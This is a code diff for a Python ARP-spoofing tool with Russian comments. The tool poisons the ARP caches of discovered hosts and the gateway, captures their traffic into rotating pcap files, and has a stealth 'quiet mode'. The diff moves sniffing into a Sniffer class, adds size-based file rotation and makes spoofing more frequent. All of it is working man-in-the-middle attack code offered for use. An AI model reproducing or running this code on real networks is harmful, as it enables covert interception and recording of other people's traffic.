@@ -20,11 +20,11 @@ from datetime import datetime
 
 verbose_enabled = True
 bidirectional = True
+rotate_output_len = 0
 PID = os.getpid()
 
 LOG_FILENAME = datetime.now().strftime('logfile_%H_%M_%S_%d_%m_%Y.log')
 log.basicConfig(level=log.INFO, filename=LOG_FILENAME, filemode="w", format="%(asctime)s %(levelname)s %(message)s")
-
 
 def check_privileges():
     if not os.environ.get("SUDO_UID") and os.geteuid() != 0:
@@ -83,34 +83,60 @@ def arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac):
         if bidirectional:
             log.info(f"Send spoof that {victim_ip} ({victim_mac}) is {victim_ip} ({spoof_mac})")
 
+class Sniffer:
+    def __init__(self, interface="eth0", queue=None, pcap_name="", rotate_output_len=0):
+        self.interface = interface
+        self.queue = queue
+        self.pcap_name = pcap_name
+        self.rotate_output_len = rotate_output_len
+        
 
-def sniff_and_find_new_devices(interface="eth0", queue=None, pcap_name=""):
-    """
-  Функция для поиска новых устройств по DHCP и ARP,
-  записи трафика в .pcap файл и передачи данных в очередь.
-  """
-    # Запись трафика в pcap файл
-    if pcap_name != "":
-        pktdump = PcapWriter(pcap_name, append=True, sync=True)
+    def sniff_and_find_new_devices(self):
+        """
+        Функция для поиска новых устройств по DHCP и ARP,
+        записи трафика в .pcap файл и передачи данных в очередь.
+        """
+        # Запись трафика в pcap файл
+        if self.pcap_name != "":
+            self.file_num = 1
+            #pcap = str(pcap_name.partition("."))[0]
+            self.pcap_name_real = datetime.now().strftime(f'{self.pcap_name}_%H_%M_%S_%d_%m_%Y.pcap')
+            self.pktdump = PcapWriter(self.pcap_name_real, append=True, sync=True)
+            self.last_check_time = time.time()
+        if self.rotate_output_len != 0:
+            self.log_filename = LOG_FILENAME
+            self.log_file_num = 1
+        while True:
+            try:
+                # Начинаем захват пакетов
+                sniff(prn=self.packet_handler, iface=self.interface, store=0)
+            except OSError as e:
+                if verbose_enabled:
+                    print(f"Ошибка сети: {e}")
+                else:
+                    log.error(f"Net error: {e}")
+                restart_network_service()
+                # Повторно пробуем инициализировать сетевой интерфейс
+                try:
+                    restart_network_interface(self.interface)
+                    if verbose_enabled:
+                        print(f"Сетевой интерфейс '{self.interface}' активирован.")
+                    else:
+                        log.error(f"Interface '{self.interface}' activated.")
+                except OSError as e:
+                    if verbose_enabled:
+                        print(f"Ошибка: Не удалось активировать сетевой интерфейс '{self.interface}'")
+                    else:
+                        log.error(f"Error: Unable to activate net interface '{self.interface}'")
+                    time.sleep(5)  # Ожидание перед попыткой перезапуска
 
-    # Функция для обработки пакетов
-    def packet_handler(packet):
-        nonlocal queue
-        spoof_ip = get_if_addr(interface)
+        # Функция для обработки пакетов
+    def packet_handler(self, packet):
+        #nonlocal queue
+        spoof_ip = get_if_addr(self.interface)
 
         if packet.haslayer(DHCP):
-            # Извлекаем IP и MAC адреса
-            victim_ip = packet[IP].src
-            victim_mac = packet[Ether].src
-
-            target_ip = packet[IP].dst
-            target_mac = packet[Ether].dst
-
-            # Проверяем, является ли устройство новым
-            if target_ip not in queue.queue:
-                # Добавляем устройство в очередь
-                queue.put((victim_ip, victim_mac))
-                queue.put((target_ip, target_mac))
+            pass # to avoid eternal reconnecting
         elif packet.haslayer(ARP):
             # Извлекаем IP и MAC адреса
             if packet[ARP].op == 2:
@@ -121,10 +147,10 @@ def sniff_and_find_new_devices(interface="eth0", queue=None, pcap_name=""):
                 target_mac = packet[ARP].hwdst
 
                 # Проверяем, является ли устройство новым
-                if target_ip not in queue.queue:
+                if target_ip not in self.queue.queue: 
                     # Добавляем устройство в очередь
-                    queue.put((victim_ip, victim_mac))
-                    queue.put((target_ip, target_mac))
+                    self.queue.put((victim_ip, victim_mac))
+                    self.queue.put((target_ip, target_mac))
         elif packet.haslayer(IP):
             victim_ip = packet[IP].src if packet.haslayer(IP) else packet[ARP].psrc
             victim_mac = packet[ARP].hwsrc if packet.haslayer(ARP) else packet[Ether].src
@@ -133,43 +159,53 @@ def sniff_and_find_new_devices(interface="eth0", queue=None, pcap_name=""):
             target_mac = packet[ARP].hwdst if packet.haslayer(ARP) else packet[Ether].dst
 
             if str(target_ip).rpartition(".")[0] == str(spoof_ip).rpartition(".")[0] and str(target_ip) != str(spoof_ip):
-                if target_mac != "ff:ff:ff:ff:ff:ff" and target_mac != "00:00:00:00:00:00":
-                    if target_ip not in queue.queue:
-                        queue.put((target_ip, target_mac))
-                        queue.put((target_ip, target_mac))
+                if target_mac != "ff:ff:ff:ff:ff:ff" and target_mac != "00:00:00:00:00:00" and target_ip != "255.255.255.255":
+                    if target_ip not in self.queue.queue:
+                        self.queue.put((target_ip, target_mac))
+                        self.queue.put((target_ip, target_mac))
             if str(victim_ip).rpartition(".")[0] == str(spoof_ip).rpartition(".")[0] and str(victim_ip) != str(spoof_ip):
-                if victim_mac != "ff:ff:ff:ff:ff:ff" and victim_mac != "00:00:00:00:00:00":
-                    if target_ip not in queue.queue:
-                        queue.put((victim_ip, victim_mac))
-                        queue.put((victim_ip, victim_mac))
+                if victim_mac != "ff:ff:ff:ff:ff:ff" and victim_mac != "00:00:00:00:00:00" and victim_ip != "255.255.255.255":
+                    if victim_ip not in self.queue.queue:
+                        self.queue.put((victim_ip, victim_mac))
+                        self.queue.put((victim_ip, victim_mac))
+        
 
         # Записываем пакет в pcap файл
-        if pcap_name != "":
-            pktdump.write(packet)
+        if self.pcap_name != "":
+            self.pktdump.write(packet)
+            if self.rotate_output_len != 0:
+                if time.time() - self.last_check_time >= 300: # Проверяем каждые 5 минут
+                    try:
+                        statinfo = os.stat(self.pcap_name_real)
+                        if statinfo.st_size >= (self.rotate_output_len):
+                            self.pktdump.close()
+                            self.file_num += 1
+                            self.pcap_name_real = datetime.now().strftime(f'{self.pcap_name}_%H_%M_%S_%d_%m_%Y_rotated_{self.file_num}.pcap')
+                            
+                            self.pktdump = PcapWriter(self.pcap_name_real, append=True, sync=True)
+                            log.info(f"PCAP file rotated, new one is {self.pcap_name_real}")
+                        
+                        statinfo = os.stat(self.log_filename)
+                        if statinfo.st_size >= (self.rotate_output_len):
+                            log.shutdown()
 
-    while True:
-        try:
-            # Начинаем захват пакетов
-            sniff(prn=packet_handler, iface=interface, store=0)
-        except OSError as e:
-            if verbose_enabled:
-                print(f"Ошибка сети: {e}")
-            else:
-                log.error(f"Net error: {e}")
-            restart_network_service()
-            # Повторно пробуем инициализировать сетевой интерфейс
-            try:
-                restart_network_interface(interface)
-                if verbose_enabled:
-                    print(f"Сетевой интерфейс '{interface}' активирован.")
-                else:
-                    log.error(f"Interface '{interface}' activated.")
-            except OSError as e:
-                if verbose_enabled:
-                    print(f"Ошибка: Не удалось активировать сетевой интерфейс '{interface}'")
-                else:
-                    log.error(f"Error: Unable to activate net interface '{interface}'")
-                time.sleep(5)  # Ожидание перед попыткой перезапуска
+                            self.log_filename = datetime.now().strftime(f'logfile_%H_%M_%S_%d_%m_%Y_rotated_{self.log_file_num}.log')
+
+                            self.log_file_num += 1
+                            log.info(f"LOG file rotated, new one is {self.log_filename}")
+                            
+                            log.basicConfig(level=logging.INFO, filename=self.log_filename, filemode="w",
+                                    format="%(asctime)s %(levelname)s %(message)s")
+                            log.info(f"LOG file rotated, new one is {self.log_filename}")
+                        
+                        
+                        self.last_check_time = time.time()
+                    except FileNotFoundError:
+                        print(f"Error: File not found. Please ensure the directory exists.")
+                    except OSError as e:
+                        print(f"An OS error occurred: {e}")
+                    except Exception as e:
+                        print(f"An unexpected error occurred: {e}")
 
 
 def restart_network_service():
@@ -287,10 +323,13 @@ def main():
     parser.add_argument("-q", "--quiet_mode", type=str,
                         help="Включение режима минимальной заметности в сети, а соответственно и режима однонаправленности (True/False)",
                         default="False")
+    parser.add_argument("--rotate_output_len", type=int,
+                        help="Включение режима ротации выходных файлов и определение максимального размера файла (количество байт)",
+                        default="0")
 
     args = parser.parse_args()
 
-    renew_arp_spoof_time = 120 # количество секунд до переотправки в эфир подделки собой всех найденных локальных ip (по желанию может быть вынесено в атрибуты командной строки)
+    renew_arp_spoof_time = 20 # количество секунд до переотправки в эфир подделки собой всех найденных локальных ip (по желанию может быть вынесено в атрибуты командной строки)
 
     # Получаем параметры из командной строки
     interface = args.interface
@@ -307,13 +346,17 @@ def main():
     if quiet_mode:
         global bidirectional
         bidirectional = False
+    global rotate_output_len
+    rotate_output_len = int(args.rotate_output_len)
 
-    log.info(f"Got arguments: interface={interface}, spoof_ip={spoof_ip}, spoof_mac={spoof_mac}, gateway_ip={gateway_ip}, gateway_mac={gateway_mac},pcap_name={pcap_name}, verbose_enabled={verbose_enabled}, quiet_mode={quiet_mode}")
+    log.info(f"Got arguments: interface={interface}, spoof_ip={spoof_ip}, spoof_mac={spoof_mac}, gateway_ip={gateway_ip}, gateway_mac={gateway_mac},pcap_name={pcap_name}, verbose_enabled={verbose_enabled}, quiet_mode={quiet_mode}, rotate_output_len={rotate_output_len}")
     # Создаем очередь для передачи данных
     queue = Queue()
 
+    sniffer = Sniffer(interface, queue, pcap_name, rotate_output_len)
+
     # Запускаем параллельный процесс для сканирования
-    sniff_thread = threading.Thread(target=sniff_and_find_new_devices, args=(interface, queue, pcap_name))
+    sniff_thread = threading.Thread(target=sniffer.sniff_and_find_new_devices, args=())
     sniff_thread.daemon = True  # Делаем поток фоновым
     sniff_thread.start()
     log.info("Started sniffing thread")
@@ -336,6 +379,7 @@ def main():
             last_spoof_time[gateway_ip] = time.time()
         else:
             old_list += network_arp_discovery(interface)
+        log.info(f"Studying local network gave us devices: {old_list}")
 
     while True:
         try:
@@ -349,6 +393,7 @@ def main():
             # Извлекаем данные из очереди
             victim_ip, victim_mac = queue.get(timeout=1)
             target_ip, target_mac = queue.get(timeout=1)
+            #print("got a packet!!!")
             if target_ip != spoof_ip and victim_ip != spoof_ip and target_mac != spoof_mac and victim_mac != spoof_mac:
                 if target_ip not in old_list:
                     # Добавляем запрашиваемое устройство в очередь
@@ -359,8 +404,8 @@ def main():
                     last_spoof_time[target_ip] = time.time()
                 else:
                     # Проверяем время последней ARP-подделки для этого устройства
-                    if target_ip in last_spoof_time and time.time() - last_spoof_time[target_ip] >= 120:
-                        # Отправляем ARP-подделку, если прошло более 1 минут
+                    if target_ip in last_spoof_time and time.time() - last_spoof_time[target_ip] >= 15:
+                        # Отправляем ARP-подделку, если прошло более 15 секунд
                         arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac)
                         last_spoof_time[target_ip] = time.time()
             if not quiet_mode and time.time() - global_resend_time >= renew_arp_spoof_time:
